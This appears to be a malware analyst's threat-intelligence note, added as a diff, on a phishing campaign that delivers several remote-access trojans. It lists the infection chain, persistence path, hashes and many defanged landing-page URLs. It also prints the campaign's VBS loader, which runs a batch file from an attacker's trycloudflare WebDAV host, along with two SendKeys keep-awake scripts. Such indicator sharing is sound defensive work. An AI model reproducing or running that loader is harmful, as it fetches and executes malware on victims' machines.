@@ -1,0 +1,138 @@
+================================================================
+MULTIRAT (DCRAT, VenomRAT, AsyncRAT, XWorm (x3), PureLogs Stealer)
+================================================================
+
+Infection Chain
+
+Email -> Lnk -> VBS -> BAT -> ZIP -> Multi RAT 
+
+
+================================================================
+
+PERSISTENCE METHOD
+C:\Users\analyst\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+================================================================
+
+LNK FILE HASH
+1A80GBSVARTYSCAVA_pdf.lnk
+6191a1a7f5c4bf1bcbf21573de1697fd  
+\\scan-interpreted-roman-glad[.]trycloudflare[.]com@SSL\DavWWWRoot\new[.]vbs
+
+
+
+================================================================
+new.vbs
+5f8b33883ebb0b907f879fb981798d88
+VBS FILE CONTENTS
+
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "cmd.exe /c \\scan-interpreted-roman-glad.trycloudflare.com@SSL\DavWWWRoot\new.bat", 0, False
+
+
+================================================================
+new.bat - obfuscated
+a9f0c3c76516726b8de37c169f6ddec5
+
+It probably downloads zip file from Webdav
+
+
+
+
+================================================================
+
+pws1.vbs
+06480f1e6aa48daab019e8f1a6b834c9
+
+Dim WshShell
+Set WshShell = WScript.CreateObject("WScript.Shell")
+
+Do While True
+    WshShell.SendKeys("+") ' Simulates pressing the Shift key
+    WScript.Sleep(40000)   ' Waits for 50 seconds before sending the next key
+Loop
+
+================================================================
+pws.vbs
+2862ffb5ea32ff114bebe41576441b02
+
+Dim WshShell
+Set WshShell = WScript.CreateObject("WScript.Shell")
+Do While True
+        WshShell.SendKeys("{F15}")
+        WScript.Sleep(55000)
+Loop
+
+
+================================================================
+
+IOC's
+
+Landing Pages
+caringforyousupport[.]com[.]au/Receipt536354[.]php
+caringforyousupport[.]com[.]au/Invoice53432[.]html
+johnsonholdings[.]us/Receipt[.]php
+aminoroc[.]org/Invoice_receipt.html
+aminoroc[.]org/Payment[.]html
+vbccorretoradeseguros[.]com[.]br/Receipt5290[.]html
+brainlysolutions[.]com/Receipt[.]html
+dev[.]inolab[.]org/Receipt5142[.]html
+www[.]movingcompanymesa[.]org/Receipt[.]php
+harfir[.]org/Receipt[.]html
+motoruniverse[.]com/Square_invoice.html
+garfieldthecat[.]tech/Receipt768[.]html
+desbullariamos[.]sa[.]com/RBC_Policy_2025.PDF[.]html
+promptful[.]biz/Receipt970[.]html
+rtigasen[.]us/Receipt[.]php
+iderif[.]org/Receipt[.]php
+listafrica[.]org/Receipt[.]html
+happyfeeds[.]co[.]in/Receipt[.]html
+truthisdivine[.]edu[.]lk/receipt[.]html
+cbholdings[.]mw/Receipt837489[.]html
+gaby20[.]org/receipt2412[.]php
+desbullariamos[.]sa[.]com/INV091-Dezember-2024[.]html
+collegerp[.]org[.]in/Receipt_pdf.html
+desbullariamos[.]sa[.]com/Bank_Statement_2024.htm
+desbullariamos[.]sa[.]com/FCT_N132_Novembre_2024.html
+happyfeeds[.]co[.]in/Receipt63537[.]htm
+fosuasauthentic[.]com/Receipt25243[.]html
+vmorservices[.]org/3805815_Receipt.html
+hebrewrootsassembly[.]org/Receipt[.]html
+desbullariamos[.]sa[.]com/ORDER209[.]html
+desbullariamos[.]sa[.]com/order[.]html
+jcjeck[.]jundy[.]org/Receipt[.]html
+foundersedition[.]lk/invoice_receipt.html
+aliatoengenharia[.]com[.]br/invoice_receipt.html
+foundersedition[.]lk/invoice_receipt.html?__im-autENFBp=9938553369960208356
+pub-b49ed37a138d4273bb24e6ebbcb21c84[.]r2[.]dev/Order_confirmation.html
+pub-f7808fef1de942f693af4beb1b04ee03[.]r2[.]dev/Documents[.]html
+pub-5708ccd63e154830b51d27cb5c1180e0[.]r2[.]dev/Documents[.]html
+
+Hashes
+0cdf36bb818af1c1634ae06bc87668e8  bab.zip
+9285c7df34d011a87be823b39ae4cb36  cam.zip
+a9f0c3c76516726b8de37c169f6ddec5  new.bat
+5f8b33883ebb0b907f879fb981798d88  new.vbs
+06480f1e6aa48daab019e8f1a6b834c9  pws1.vbs
+2862ffb5ea32ff114bebe41576441b02  PWS.vbs
+710b106acf55aea6dffce81b9fff7e06  startupppp.bat
+
+bab.zip
+4a4d26e640134a4e8d6fada9d2ee3d97  tumb-an.py
+71c23e7ea36d3676c7fda2e0672f2718  tumb-as.py
+c4e93ecb03d603b13b82fb25cdc749fd  tumb-hv.py
+9ea6642468e5d408cb708108835cc1ff  tumb-ph.py
+0405d710a59781118a057a86f6c160c7  tumb-ve.py
+1e4e3433d2b8981d33d4c79b23243228  tumb-xw3.py
+183b95fdb32019c9a9a22121e4414d71  tumb-xw5.py
+
+cam.zip
+52fd0fe92cdae5634afc7640b1aa0d72  tumb-an.py
+ee8409863d788085bf4d4b47c5c8c9d1  tumb-as.py
+785780603f85329b6643d6421af93917  tumb-hv.py
+556a0c6482e798b4547d51e0ca46c74c  tumb-ph.py
+0a65876f60663bc634a8bdc3861b0a55  tumb-ve.py
+1e4d174dd0210a42b4b5dac641deb88e  tumb-xw3.py
+57644571d74934bbadaeba0751d46531  tumb-xw5.py
+
+
+
